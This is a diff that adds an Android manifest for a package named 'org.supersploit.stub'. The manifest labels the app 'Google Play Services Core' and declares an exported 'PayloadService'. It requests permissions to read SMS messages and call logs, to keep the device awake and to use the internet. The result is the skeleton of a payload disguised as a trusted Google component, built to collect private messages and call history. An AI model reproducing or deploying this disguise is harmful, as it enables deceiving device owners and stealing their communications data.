@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="33" android:compileSdkVersionCodename="13" package="org.supersploit.stub" platformBuildVersionCode="33" platformBuildVersionName="13">
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <application android:label="Google Play Services Core">
+        <service android:exported="true" android:name=".PayloadService"/>
+    </application>
+</manifest>
